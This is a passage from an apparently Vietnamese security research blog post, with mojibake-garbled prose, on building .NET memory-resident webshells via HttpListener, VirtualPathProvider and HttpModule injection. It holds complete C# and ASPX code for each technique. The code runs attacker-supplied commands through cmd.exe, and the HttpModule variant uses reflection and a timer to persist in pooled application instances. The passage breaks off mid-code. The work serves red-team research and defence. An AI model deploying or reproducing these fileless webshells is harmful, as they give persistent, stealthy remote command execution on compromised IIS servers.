thá»±c hiá»‡n Ä‘Æ°á»£c cÃ¡c hÃ m tÄ©nh. Äá»ƒ lÃ m rÃµ hÆ¡n thÃ¬ mÃ¬nh cÃ³ Ä‘oáº¡n code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 HttpListenerContext context = listener.GetContext(); HttpListenerRequest request = context.Request; HttpListenerResponse response = context.Response; try { // Láº¥y data tá»« request string data = new StreamReader(request.InputStream, request.ContentEncoding).ReadToEnd(); // ÄÆ°a data vá» dáº¡ng byte byte[] rawData = Encoding.Default.GetBytes(data); // Khá»Ÿi tao object HttpRequst thuá»™c namespace System.Web Ä‘á»ƒ sá»­ dá»¥ng request linh hoáº¡t hÆ¡n HttpRequest req = new HttpRequest(\u0026#34;\u0026#34;, request.Url.ToString(), request.QueryString.ToString()); // Kiá»ƒm tra giÃ¡ trá»‹ cá»§a biáº¿n test String test = req.Form[\u0026#34;test\u0026#34;]; if (test != null) { Console.WriteLine(\u0026#34;Parameter test = \u0026#34; + test); } else { Console.WriteLine(\u0026#34;Parameter test is null!!!\u0026#34;); } } catch (Exception e){ return; } â€¦ CustomListener(\u0026#34;http://localhost:8000/test/\u0026#34;); Khi gá»­i mÃ¬nh post Ä‘áº¿n service thÃ¬ chá»‰ nháº­n Ä‘Æ°á»£c thÃ´ng bÃ¡o null, chá»©ng tá» HttpRequest khÃ´ng láº¥y Ä‘Æ°á»£c dá»¯ liá»‡u cá»§a POST body: Äáº¿n nÆ°á»›c nÃ y thÃ¬ mÃ¬nh cáº§n Ä‘i vÃ o source Ä‘á»ƒ xem xÃ©t rá»“i. HÃ m xá»­ lÃ½ thá»±c cháº¥t sáº½ Ä‘i qua method EnsureForm dÃ¹ng Ä‘á»ƒ kiá»ƒm tra xem Form cÃ³ há»£p lá»‡ hay khÃ´ng, sau Ä‘Ã³ tráº£ vá» thuá»™c tÃ­nh _form cá»§a object Ä‘á»ƒ xá»­ lÃ½, tá»« Ä‘Ã³ suy ra thuá»™c tÃ­nh _form chÃ­nh lÃ  nÆ¡i lÆ°u trá»¯ dá»¯ liá»‡u cá»§a POST body trong má»™t HTTP Request: Táº¡i Ä‘Ã¢y, EnsureForm check náº¿u thuá»™c tÃ­nh _form lÃ  null vÃ  thuá»™c tÃ­nh _wr khÃ¡c null thÃ¬ sáº½ gá»i Ä‘áº¿n FillInFormCollection Ä‘á»ƒ Ä‘iá»n thÃ´ng tin vÃ o form má»›i, cÃ²n náº¿u nhÆ° _wr lÃ  null thÃ¬ tiáº¿n hÃ nh set thuá»™c tÃ­nh cho form hiá»‡n táº¡i lÃ  Read Only. CÃ²n trong trÆ°á»ng há»£p _form Ä‘Ã£ tá»“n táº¡i tá»©c khÃ¡c null sáº½ tráº£ vá» _form Ä‘Ã³ luÃ´n: Tiáº¿p tá»¥c nháº£y vÃ o method FillInFormCollection, Ä‘Ã¢y lÃ  nÆ¡i xá»­ lÃ½ dá»¯ liá»‡u hay Ä‘á»ƒ Ä‘iá»n dá»¯ liá»‡u vÃ o _form. Do muá»‘n xá»­ lÃ½ kiá»ƒu key-param nÃªn mÃ¬nh chÃº Ã½ Ä‘áº¿n content-type application/x-www-form-urlencoded trÆ°á»›c: Táº¡i Ä‘Ã¢y mÃ¬nh tháº¥y dá»¯ liá»‡u Ä‘Æ°á»£c fill thÃ´ng qua hÃ m FillFromEncodedBytes vá»›i 2 tham sá»‘: : dá»¯ liá»‡u dÆ°á»›i dáº¡ng byte vÃ  loáº¡i encoding. CÃ²n láº¡i, náº¿u nhÆ° kiá»ƒu content-type lÃ  multipart/form-data, lÃ  dá»¯ liá»‡u Ä‘Æ°á»£c gá»­i lÃªn cÃ³ boundary, thÆ°á»ng Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ upload file thÃ¬ sáº½ cháº¡y vÃ²ng for Ä‘á»ƒ thÃªm giÃ¡ trá»‹ cá»§a tá»«ng tham sá»‘ má»™t trong form theo thá»© tá»±: NhÆ° váº­y, Ä‘á»ƒ cÃ³ thá»ƒ lÆ°u Ä‘Æ°á»£c dá»¯ liá»‡u trong POST body vÃ o _form thÃ¬ ta cáº§n má»™t trong hai Ä‘iá»u kiá»‡n: _wr khÃ¡c null hoáº·c _form khÃ¡c null. Xem xÃ©t Ä‘áº¿n kháº£ nÄƒng Ä‘áº§u tiÃªn, _wr chá»‰ cÃ³ thá»ƒ Ä‘Æ°á»£c set trong quÃ¡ trÃ¬nh khá»Ÿi táº¡o object class HttpRequest. Chá»‰ cÃ³ constructor Ä‘áº§u tiÃªn cÃ³ thá»ƒ chÃ¨n Ä‘Æ°á»£c giÃ¡ trá»‹ vÃ o _wr, nhÆ°ng chá»‰ cÃ³ constructor thá»© 2 lÃ  public tá»©c cÃ³ thá»ƒ gá»i trá»±c tiáº¿p tá»« public class HttpRequest. Náº¿u váº­y thÃ¬ mÃ¬nh sáº½ Ä‘i theo hÆ°á»›ng thá»© 2, lÃ m cho _form khÃ¡c null. KhÃ´ng cáº§n pháº£i gÃ¡n thÃ´ng qua viá»‡c khá»Ÿi táº¡o má»™t HttpWorkerRequest mÃ  sá»­ dá»¥ng reflection Ä‘á»ƒ khá»Ÿi táº¡o má»™t object cÃ³ kiá»ƒu dá»¯ liá»‡u HttpValueCollection giá»‘ng _form, vÃ  tá»« Ä‘Ã³ gá»i Ä‘áº¿n method FillFromEncodedBytes, truyá»n tháº³ng dá»¯ liá»‡u cá»§a body request vÃ o method Ä‘Ã³. Äoáº¡n mÃ£ thá»±c hiá»‡n sáº½ nhÆ° sau:\n1 2 3 4 5 6 7 FieldInfo field = req.GetType().GetField(\u0026#34;_form\u0026#34;, BindingFlags.Instance | BindingFlags.NonPublic); Type formtype = field.FieldType; MethodInfo method = formtype.GetMethod(\u0026#34;FillFromEncodedBytes\u0026#34;, BindingFlags.Instance | BindingFlags.NonPublic); ConstructorInfo constructor = formtype.GetConstructor(BindingFlags.NonPublic | BindingFlags.Instance, null, new Type[0], null); object obj = constructor.Invoke(null); method.Invoke(obj, new object[] { rawData, request.ContentEncoding }); field.SetValue(req, obj); ThÃªm chá»— nÃ y vÃ o Ä‘oáº¡n code test vÃ  á»‘p nguyÃªn request trÆ°á»›c, láº§n nÃ y thÃ¬ mÃ¬nh Ä‘Ã£ láº¥y Ä‘Æ°á»£c value cho param test: Deploy Äoáº¡n code mÃ¬nh táº¡o má»™t HTTPListener, chá»‰ thÃªm pháº§n xá»­ lÃ½ Ä‘áº§u vÃ o vÃ  hiá»ƒn thá»‹ ra ngoÃ i thÃ´i:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 public static void CustomListener(string url){ HttpListener listener = new HttpListener(); listener.Prefixes.Add(url); listener.Start(); while (listener.IsListening){ HttpListenerContext context = listener.GetContext(); HttpListenerRequest request = context.Request; HttpListenerResponse response = context.Response; Stream stm = null; try{ string data = new StreamReader(request.InputStream, request.ContentEncoding).ReadToEnd(); byte[] rawData = Encoding.Default.GetBytes(data); HttpRequest req = new HttpRequest(\u0026#34;\u0026#34;, request.Url.ToString(), request.QueryString.ToString()); FieldInfo field = req.GetType().GetField(\u0026#34;_form\u0026#34;, BindingFlags.Instance | BindingFlags.NonPublic); Type formtype = field.FieldType; MethodInfo method = formtype.GetMethod(\u0026#34;FillFromEncodedBytes\u0026#34;, BindingFlags.Instance | BindingFlags.NonPublic); ConstructorInfo constructor = formtype.GetConstructor(BindingFlags.NonPublic | BindingFlags.Instance, null, new Type[0], null); object obj = constructor.Invoke(null); method.Invoke(obj, new object[] { rawData, request.ContentEncoding }); field.SetValue(req, obj); String cmd = req.Form[\u0026#34;command\u0026#34;]; if (cmd != null){ if (cmd == \u0026#34;exit\u0026#34;){ listener.Stop(); } Process p = new Process(); p.StartInfo.FileName = \u0026#34;cmd.exe\u0026#34;; p.StartInfo.Arguments = \u0026#34;/c\u0026#34; + cmd; p.Start(); byte[] output = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd()); response.StatusCode = 200; response.ContentLength64 = output.Length; stm = response.OutputStream; stm.Write(output, 0, output.Length); } } catch (Exception e){ return; } } } ... CustomListener(\u0026#34;http://localhost:5000/memshell/\u0026#34;); Ngon luÃ´n: Giá»›i Háº¡n CÃ¢u há»i Ä‘áº·t ra lÃ , mÃ¬nh cÃ³ Ä‘á» cáº­p Ä‘áº¿n viá»‡c ká»¹ thuáº­t cáº§n quyá»n System nhÆ°ng táº¡i Ä‘Ã¢y ngÆ°á»i dÃ¹ng thÃ´ng thÆ°á»ng váº«n cÃ³ thá»ƒ triá»ƒn khai Ä‘Æ°á»£c HttpListener Memory Webshell?\nÄá»ƒ cháº¡y má»™t HttpListerner báº¯t buá»™c pháº£i thÃªm Ä‘Æ°á»ng dáº«n Ä‘áº¿n HTTP Server thÃ´ng qua dÃ²ng lá»‡nh: HttpListener.Prefixes.Add, method nÃ y thá»±c cháº¥t gá»i Ä‘áº¿n HttpListener.AddPrefix, nÆ¡i sáº½ tiáº¿p tá»¥c gá»i Ä‘áº¿n HttpListener.InternalAddPrefix vÃ  cuá»‘i cÃ¹ng lÃ  HttpAddUrlToUrlGroup. ÄÃ¢y lÃ  method Ä‘Æ°á»£c import tá»« native dll httpapi.dll: Vá» chá»©c nÄƒng, thÃ´ng tin cÅ©ng nhÆ° lÆ°u Ã½ cá»§a hÃ m nÃ y, Microsoft Ä‘Ã£ thÃ´ng bÃ¡o rÃµ ráº±ng tham sá»‘ pFullyQualifiedUrl chá»©a url truyá»n vÃ o náº¿u nhÆ° cÃ³ cá»•ng dá»‹ch vá»¥ nhá» hÆ¡n 1024 cáº§n quyá»n System Ä‘á»ƒ thá»±c thi, náº¿u khÃ´ng sáº½ dÃ­nh lá»—i Access Denied: Tá»©c lÃ  trong trÆ°á»ng há»£p ngÆ°á»i dÃ¹ng web khÃ´ng cÃ³ quyá»n System, khÃ´ng thá»ƒ táº¡o Ä‘Æ°á»£c HTTP Server thÃ´ng qua HttpListener mÃ  cá»•ng dá»‹ch vá»¥ nhá» hÆ¡n 1024.\nNgoÃ i viá»‡c sá»­ dá»¥ng port tháº¥p ra, náº¿u nhÆ° muá»‘n khá»Ÿi táº¡o Server vá»›i IP khÃ´ng pháº£i localhost/127.0.0.1 mÃ  lÃ  IP cá»§a card máº¡ng wifi hoáº·c ethernet cÅ©ng cáº§n quyá»n System: Ä‘Ã¢y chÃ­nh lÃ  Ä‘iá»ƒm yáº¿u vÃ¬ trong mÃ´i trÆ°á»ng táº¥n cÃ´ng viá»‡c má»Ÿ server báº±ng IP local lÃ  vÃ´ nghÄ©a. VÃ­ dá»¥ nhÆ° á»Ÿ Ä‘Ã¢y Ä‘á»‹a chá»‰ IP card wifi cá»§a mÃ¬nh lÃ  192.168.100.198: Náº¿u nhÆ° khá»Ÿi táº¡o HttpListener lÃ  http://192.168.100.198:5000/memshell/ sáº½ dÃ­nh lá»—i khÃ´ng cÃ³ quyá»n, do ngÆ°á»i dÃ¹ng deploy web Ä‘ang lÃ  user thÆ°á»ng: NgoÃ i ra, sá»­ dá»¥ng wildcard IP hoáº·c wildcard hostname nhÆ°: http://*:8080/, http://+:8080/ cÅ©ng yÃªu cáº§u quyá»n System Ä‘á»ƒ thá»±c thi.\nVirtualPath Memory Webshell ÄÃ¢y lÃ  ká»¹ thuáº­t Ä‘Æ°á»£c sá»­ dá»¥ng phá»• biáº¿n nháº¥t khi explot .NET Memory Webshell, Ä‘Æ°á»£c sá»­ dá»¥ng lÃ m method táº¡o memshell trÃªn Godzilla: https://github.com/A-D-Team/SharpMemshell/blob/main/VirtualPath/memshell.cs\nÄá»ƒ vÃ­ dá»¥ VirtualPathProvider trá»±c quan hÆ¡n thÃ¬ mÃ¬nh cÃ³ cÃ¡ch diá»…n giáº£i nhÆ° sau: ThÃ´ng thÆ°á»ng Ä‘á»ƒ truy cáº­p file aspx thÃ¬ trÃªn há»‡ thá»‘ng buá»™c pháº£i tá»“n táº¡i file tÆ°Æ¡ng á»©ng trong thÆ° má»¥c web váº­t lÃ½, cÃ²n VirtualPathProvider giÃºp lÆ°u trá»¯ file File.aspx á»Ÿ báº¥t cá»© Ä‘Ã¢u chá»© khÃ´ng nháº¥t thiáº¿t pháº£i tá»“n táº¡i trong há»‡ thá»‘ng file váº­t lÃ½ táº¡i server, cÃ³ thá»ƒ lÃ  lÆ°u trong database,\u0026hellip; Not so memshell Tá»« khÃºc nÃ y mÃ¬nh sáº½ viáº¿t táº¯t VirtualPathProvider = VPP.\nMethod RegisterVirtualPathProviderInternal chá»‹u trÃ¡ch nhiá»‡m thÃªm VPP má»›i vÃ o há»‡ thá»‘ng báº±ng cÃ¡ch lÆ°u Ä‘Æ°á»ng dáº«n áº£o truyá»n vÃ o _virtualPathProvider, vÃ  Ä‘Æ°a VPP Ä‘Æ°á»£c Ä‘Äƒng kÃ½ trÆ°á»›c Ä‘Ã³ vÃ o method Initialize. NÆ¡i mÃ  VPP Ä‘Ã£ tá»“n táº¡i Ä‘Æ°á»£c Ä‘Æ°a vÃ o _previous: Tá»©c khi má»™t VPP má»›i Ä‘Æ°á»£c thÃªm vÃ o, VPP Ä‘Ã£ thÃªm trÆ°á»›c Ä‘Ã³ Ä‘Æ°á»£c coi nhÆ° má»™t node trÆ°á»›c vÃ  cÃ³ thá»ƒ truy cáº­p thÃ´ng qua thuá»™c tÃ­nh Previous. Khi má»™t request web page Ä‘áº¿n, á»©ng dá»¥ng xÃ©t láº§n lÆ°á»£t tá»« VirtualPath má»›i nháº¥t Ä‘áº¿n cÅ© nháº¥t cho Ä‘áº¿n khi trÃ¹ng khá»›p hoáº·c thuá»™c tÃ­nh previous lÃ  null thÃ¬ dá»«ng láº¡i. VÃ  _virtualPathProvider tá»“n táº¡i Ä‘á»ƒ chá»©a giÃ¡ trá»‹ cá»§a node má»›i nháº¥t Ä‘Æ°á»£c thÃªm vÃ o. CÃ¡ch tá»• chá»©c vÃ  duyá»‡t pháº§n tá»­ nhÆ° nÃ y khÃ¡ giá»‘ng vá»›i má»™t danh sÃ¡ch liÃªn káº¿t Ä‘Æ¡n cÃ³ 1 con trá» head. MÃ¬nh cÃ³ thá»ƒ Ä‘Äƒng kÃ½ 1 VPP vá»›i ná»™i dung tÃ¹y chá»‰nh báº±ng Ä‘oáº¡n mÃ£ sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;% string base64 = \u0026#34;PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpTY3JpcHQiICU+DQo8JSBSZXNwb25zZS5Xcml0ZSgiVmlydHVhbFBhdGggQ3JlYXRlZCBTdWNjZXNzZnVsbHkiKTsgJT4=\u0026#34;; string content = Encoding.UTF8.GetString(System.Convert.FromBase64String(base64)); string targetVirtualPath = \u0026#34;/TestPath.aspx\u0026#34;; try{ TestPathProvider testProvider = new TestPathProvider(targetVirtualPath, content); HostingEnvironment.RegisterVirtualPathProvider(testProvider); testProvider.InitializeLifetimeService(); } catch (Exception error){ Console.WriteLine(error); } %\u0026gt; Trigger file nÃ y sáº½ táº¡o 1 VPP vá»›i Ä‘Æ°á»ng dáº«n /TestPath.aspx, cÅ©ng cÃ³ thá»ƒ coi lÃ  má»™t fileless webshell: Äá»ƒ trá»Ÿ thÃ nh má»™t ká»¹ thuáº­t memshell Ä‘Ãºng nghÄ©a, mÃ¬nh muá»‘n exec command táº¡i Ä‘Æ°á»ng dáº«n báº¥t ká»³, cho nÃªn Ä‘oáº¡n code nÃ y lÃ  chÆ°a Ä‘á»§ Ä‘á»ƒ Ä‘Ã¡p á»©ng Ä‘iá»u kiá»‡n.\nVirtualPath at its finest Trong lÃºc debug thÃ¬ mÃ¬nh tháº¥y cÃ³ 2 method luÃ´n Ä‘Æ°á»£c gá»i khi truy cáº­p báº¥t ká»³ path nÃ o, Ä‘Ã³ lÃ  GetCacheKey vÃ  FileExists. NhÆ°ng khi ngÃ³ Ä‘oáº¡n code gen memshell cá»§a Godzilla, mÃ¬nh tháº¥y code memshell Ä‘Æ°á»£c truyá»n vÃ o method GetCacheKey. Äá»ƒ kiá»ƒm tra xem method nÃ o Ä‘Æ°á»£c call trÆ°á»›c, mÃ¬nh kiá»ƒm tra vá»›i 1 script Ä‘Æ¡n giáº£n:\n1 2 3 4 5 6 7 8 9 10 public class TestPathProvider : VirtualPathProvider{ public override string GetCacheKey(string virtualPath){ Console.WriteLine(\u0026#34;GetCacheKey called!!!\u0026#34;); return Previous.GetCacheKey(virtualPath); } public override bool FileExists(string virtualPath){ Console.WriteLine(\u0026#34;FileExists called!!!\u0026#34;); return Previous.FileExists(virtualPath); } } GetCacheKey Ä‘Æ°á»£c gá»i trÆ°á»›c, hiá»ƒu vÃ¬ sao nÃ³ Ä‘Æ°á»£c dÃ¹ng rá»“i ha ğŸ˜Š MÃ¬nh craft láº¡i thÃ nh code gen VirtualPath memshell:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;script runat=\u0026#34;server\u0026#34;\u0026gt; public class TestPathProvider : VirtualPathProvider{ public override string GetCacheKey(string virtualPath){ HttpContext context = HttpContext.Current; String cmd = context.Request.Form[\u0026#34;command\u0026#34;]; if (cmd != null){ HttpResponse response = context.Response; Process p = new Process(); p.StartInfo.FileName = \u0026#34;cmd.exe\u0026#34;; p.StartInfo.Arguments = \u0026#34;/c\u0026#34; + cmd; p.Start(); byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd()); response.Write(System.Text.Encoding.Default.GetString(data)); response.End(); } return Previous.GetCacheKey(virtualPath); } } \u0026lt;/script\u0026gt; \u0026lt;% TestPathProvider testProvider = new TestPathProvider(); HostingEnvironment.RegisterVirtualPathProvider(testProvider); testProvider.InitializeLifetimeService(); Response.Write(\u0026#34;VirtualPath Memory Webshell injected!!!\u0026#34;); Response.End(); %\u0026gt; Now we got the real memshell here: HTTPModule Memory Webshell Äáº¿n vá»›i ká»¹ thuáº­t gáº§n Ä‘Ã¢y vÃ  phá»©c táº¡p nháº¥t, Ä‘Æ°á»£c team researcher cá»§a VCS cÃ´ng bá»‘ táº¡i buá»•i SecTalk vÃ o thÃ¡ng 5 nÄƒm 2025 khi tiáº¿n hÃ nh RedTeam vÃ o há»‡ thá»‘ng cÃ³ sá»­ dá»¥ng Microsoft Exchange.\nÃ tÆ°á»Ÿng cá»§a ká»¹ thuáº­t nÃ y Ä‘Ã£ Ä‘Æ°á»£c Ä‘á» cáº­p trong paper cá»§a CrowdStrike vá» framework IceApple táº¡i module 18, vá»›i má»¥c Ä‘Ã­ch thÃªm má»™t EventHandler vÃ o trong cÃ¡c HttpApplication Ä‘ang Ä‘Æ°á»£c sá»­ dá»¥ng bá»Ÿi server: HttpApplication Reuse Mechanism Táº¡i pháº§n request life cycle, mÃ¬nh Ä‘Ã£ nÃ³i vá» viá»‡c má»™t HttpApplication instance Ä‘Æ°á»£c khá»Ÿi táº¡o, á»Ÿ Ä‘Ã¢y mÃ¬nh sáº½ giáº£i thÃ­ch chi tiáº¿t hÆ¡n viá»‡c nÃ³ Ä‘Æ°á»£c khá»Ÿi táº¡o nhÆ° tháº¿ nÃ o:\nKhi HTTP request Ä‘áº¿n server, nhá»¯ng hÃ m tiá»n xá»­ lÃ½ Ä‘Æ°á»£c gá»i Ä‘á»ƒ khá»Ÿi táº¡o HttpContext vÃ  cÃ¡c thÃ´ng tin cáº§n thiáº¿t. Äiá»u nÃ y Ä‘Æ°á»£c thá»±c hiá»‡n thÃ´ng qua 3 hÃ m ProcessRequestNotification trong callstack dÆ°á»›i Ä‘Ã¢y: Sau Ä‘Ã³, HttpApplicationFactory tiáº¿n hÃ nh láº¥y ra 1 instance cá»§a HttpApplication Ä‘á»ƒ handle HttpContext, viá»‡c lá»±a chá»n vÃ  láº¥y ra nhÆ° tháº¿ nÃ o náº±m táº¡i hÃ m GetNormalApplicationInstance: Táº¡i hÃ m GetNormalApplicationInstance, HttpApllicationFactory sá»­ dá»¥ng attribute _freeList chá»©a cÃ¡c object HttpApllication Ä‘Ã£ xá»­ lÃ½ xong request vÃ  Ä‘Æ°á»£c tÃ¡i cháº¿ Ä‘á»ƒ sá»­ dá»¥ng láº¡i. Náº¿u láº¥y Ä‘Æ°á»£c sáº½ tráº£ vá» object httpApplication Ä‘Ã³: Tá»« Ä‘Ã¢y rÃºt ra Ä‘Æ°á»£c má»™t sá»‘ káº¿t luáº­n vá» HttpApplication nhÆ° sau:\nMá»—i HttpApplication instance Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ xá»­ lÃ½ 1 request, vÃ  khÃ´ng thá»ƒ bá»‹ can thiá»‡p cho Ä‘áº¿n khi xá»­ lÃ½ xong Náº¿u nhÆ° sá»‘ lÆ°á»£ng request gá»­i Ä‘áº¿n nhiá»u hÆ¡n sá»‘ lÆ°á»£ng instance HttpApplication cÃ³ trong _freeList, viá»‡c táº¡o má»›i Ä‘á»ƒ thá»±c thi ngay hay sá»­ dá»¥ng láº¡i tÃ¹y thuá»™c vÃ o cÆ¡ cháº¿ Ä‘á»“ng bá»™ Náº¿u nhÆ° sá»­ dá»¥ng .NET Framework lá»›n hÆ¡n 4.5 thÃ¬ máº·c Ä‘á»‹nh cÆ¡ cháº¿ nÃ y Ä‘Æ°á»£c báº­t. Logic Add EventHandler into HttpModule Tiáº¿p tá»¥c tá»« hÃ m trÆ°á»›c, lÃºc nÃ y HttpModule Ä‘Æ°á»£c khá»Ÿi táº¡o thÃ´ng qua hÃ m hÃ m Init, vÃ  call Ä‘áº¿n cÃ¡c event handler cÃ³ trong module Ä‘Ã³, Ä‘Ã¢y cÅ©ng chÃ­nh lÃ  nhá»¯ng gÃ¬ xáº£y ra trong HTTP Pipeline Ä‘Ã£ trÃ¬nh bÃ y á»Ÿ trÃªn. Event AuthenticateRequest Ä‘á»©ng ngay sau event Ä‘áº§u tiÃªn BeginRequest - má»™t event dÃ¹ng Ä‘á»ƒ init thuá»™c tÃ­nh nÃªn cÃ³ thá»ƒ coi Ä‘Ã¢y lÃ  event sá»›m nháº¥t Ä‘Æ°á»£c gá»i.\nKhi Ä‘Æ°á»£c gá»i, AuthenticateRequest ngay láº­p tá»©c gá»i phÆ°Æ¡ng thá»©c add Ä‘á»ƒ thÃªm má»™t object thuá»™c class EventHandler vÃ o HttpModule: HÃ m AddSyncEventHookup nÃ y thá»±c cháº¥t Ä‘Æ°á»£c thá»±c hiá»‡n vá»›i tham sá»‘ isPostNotification lÃ  false: Má»™t HttpApplication cÃ³ nhiá»u HttpModule, lÆ°u trong attribute ModuleContainers - 1 máº£ng cÃ¡c pháº§n tá»­ lÃ  instance cá»§a class PipelineModuleStepContainer.\nÄá»ƒ thÃªm Ä‘Æ°á»£c Event vÃ o Ä‘Ãºng module, trÆ°á»›c háº¿t cáº§n pháº£i láº¥y module Ä‘Ã³ ra tá»« ModuleContainers thÃ´ng qua hÃ m GetModuleContainer. EventHandler Ä‘Æ°á»£c Ã©p thÃ nh SyncEventExecutionStep rá»“i má»›i thá»±c hiá»‡n thÃªm event Ä‘Ã³ táº¡i method AddEvent: HÃ m AddEvent chá»©a logic chÃ­nh Ä‘á»ƒ thÃªm 1 event vÃ o HttpModule: Event Ä‘Æ°á»£c index tÆ°Æ¡ng á»©ng vá»›i tÃªn Ä‘á»ƒ láº¥y ra giÃ¡ trá»‹ sá»‘ nguyÃªn báº±ng EventToIndex. VÃ­ dá»¥ á»Ÿ Ä‘Ã¢y event AuthenticateRequest sáº½ tráº£ vá» giÃ¡ trá»‹ lÃ  1 IIS sáº½ láº¥y ra danh sÃ¡ch cÃ¡c object HttpApplicationIExecutionStep trong máº£ng _moduleSteps táº¡i vÃ­ trÃ­ thá»© index cá»§a event Ä‘ang xá»­ lÃ½ Náº¿u list láº¥y ra khÃ¡c rá»—ng, tiáº¿n hÃ nh thÃªm event vÃ o list trÃªn Deploy Dá»±a vÃ o nhá»¯ng gÃ¬ Ä‘Ã£ tÃ¬m hiá»ƒu, HttpModule memshell cáº§n bao gá»“m:\nHÃ m Loop tiáº¿n hÃ nh inject táº¥t cáº£ cÃ¡c HttpApplication cÃ³ trong _freeList Class chÃ­nh sáº½ gá»i Ä‘áº¿n hÃ m Loop sau 1 thá»i gian nháº¥t Ä‘á»‹nh, Ä‘áº£m báº£o cÃ¡c instance HttpApplication má»›i Ä‘Æ°á»£c khá»Ÿi táº¡o cÅ©ng sáº½ bá»‹ inject HÃ m InjectHandler cÃ³ nhiá»‡m vá»¥ láº¥y ra ModuleStep thÃ´ng qua hÃ m GetModuleSteps, kiá»ƒm tra náº¿u káº¿t quáº£ tráº£ vá» khÃ¡c null tiáº¿n hÃ nh sá»­ dá»¥ng hÃ m ClearInject Ä‘á»ƒ xÃ³a EventHandler Ä‘Ã£ inject vÃ  thÃªm cÃ¡i má»›i. TrÃ¡nh trÆ°á»ng há»£p chá»‰ thÃªm khiáº¿n thá»±c hiá»‡n cÃ¢u lá»‡nh láº¡i nhiá»u láº§n. CÃ¡c class Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘a pháº§n lÃ  private vÃ  internal nÃªn cáº§n sá»­ dá»¥ng reflection khÃ¡ nhiá»u 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 \u0026lt;script runat=\u0026#34;server\u0026#34;\u0026gt; public class ModuleMemShell{ private static Assembly sysWeb = typeof(HttpApplication).Assembly; private static Type HAFClass = sysWeb.GetType(\u0026#34;System.Web.HttpApplicationFactory\u0026#34;); private static Type PipelineModuleStepContainerClass = sysWeb.GetType(\u0026#34;System.Web.PipelineModuleStepContainer\u0026#34;); private static Type HttpApplicationClass = sysWeb.GetType(\u0026#34;System.Web.HttpApplication\u0026#34;); private static Type PipelineModuleStepContainerArrayClass = sysWeb.GetType(\u0026#34;System.Web.PipelineModuleStepContainer[]\u0026#34;); private static Type SyncEventExecutionStepClass = sysWeb.GetType(\u0026#34;System.Web.HttpApplication+SyncEventExecutionStep\u0026#34;); private static Type iExecutionStepType = sysWeb.GetType(\u0026#34;System.Web.HttpApplication+IExecutionStep\u0026#34;); private static Type ListIExecutionStepClass = typeof(List\u0026lt;\u0026gt;).MakeGenericType(iExecutionStepType); private static Type ListIExecutionStepArrayClass = ListIExecutionStepClass.MakeArrayType(); private static BindingFlags flag = BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Static; public ModuleMemShell(){ if (HttpContext.Current != null){ var previous_timer = HttpContext.Current.Application[\u0026#34;loop\u0026#34;]; if (previous_timer != null){ ((System.Threading.Timer)previous_timer).Dispose(); } var timer = new System.Threading.Timer(Loop, null, 0, 3000); HttpContext.Current.Application[\u0026#34;loop\u0026#34;] = timer; HttpContext.Current.Response.Write(\u0026#34;HttpModule Memshell Injected!!!!\u0026#34;); } } void Loop(Object stateInfo){ var appFactory = HAFClass.GetField(\u0026#34;_theApplicationFactory\u0026#34;, flag).GetValue(null); var _freeList = HAFClass.GetField(\u0026#34;_freeList\u0026#34;, flag).GetValue(appFactory); foreach (var httpApplication in (IEnumerable)_freeList){ InjectHandler((HttpApplication)httpApplication); } } void InjectHandler(HttpApplication httpApplication){ object list = GetModuleSteps(httpApplication); if (list != null){ ClearInject(list); InstallNew(list, httpApplication); } } object GetModuleSteps(HttpApplication httpApplication){ foreach (var notification in Enum.GetValues(typeof(RequestNotification))){ var notification_index = (int)PipelineModuleStepContainerClass.GetMethod(\u0026#34;EventToIndex\u0026#34;, flag).Invoke(null, new object[] { notification }); var ModuleContainers = (HttpApplicationClass.GetProperty(\u0026#34;ModuleContainers\u0026#34;, flag).GetValue(httpApplication)); var ModuleContainersLength = (Int32)PipelineModuleStepContainerArrayClass.GetProperty(\u0026#34;Length\u0026#34;, flag).GetValue(ModuleContainers); for (int i = 0; i \u0026lt; ModuleContainersLength; i++){ var moduleContainer = PipelineModuleStepContainerArrayClass.GetMethod(\u0026#34;Get\u0026#34;, flag).Invoke(ModuleContainers, new object[] { i }); var _moduleSteps = PipelineModuleStepContainerClass.GetField(\u0026#34;_moduleSteps\u0026#34;, flag).GetValue(moduleContainer); if (_moduleSteps != null){ var list = ListIExecutionStepArrayClass.GetMethod(\u0026#34;Get\u0026#34;, flag).Invoke(_moduleSteps, new object[] { notification_index }); if (list != null){ return list; } } } } return null; } void InstallNew(object list, HttpApplication httpApplication){ var syncEventExecutionStep = SyncEventExecutionStepClass.GetConstructor(flag, null, new Type[] { typeof(HttpApplication), typeof(EventHandler) }, null) .Invoke(new object[] { httpApplication, (EventHandler)CustomHandler }); ListIExecutionStepClass.GetMethod(\u0026#34;Add\u0026#34;, flag).Invoke(list, new object[] { syncEventExecutionStep }); } void ClearInject(object list){ var list_count = (int)ListIExecutionStepClass.GetProperty(\u0026#34;Count\u0026#34;, flag).GetValue(list); for (int i = 0; i \u0026lt; list_count; i++){ var syncEventExecutionStep = ListIExecutionStepClass.GetMethod(\u0026#34;get_Item\u0026#34;, flag).Invoke(list, new object[] { i }); if (syncEventExecutionStep != null){ var handler = (Delegate)SyncEventExecutionStepClass.GetProperty(\u0026#34;Handler\u0026#34;, flag).GetValue(syncEventExecutionStep); var handler_name = handler.Method.DeclaringType.FullName + \u0026#34;.\u0026#34; + handler.Method.Name; if (handler_name == 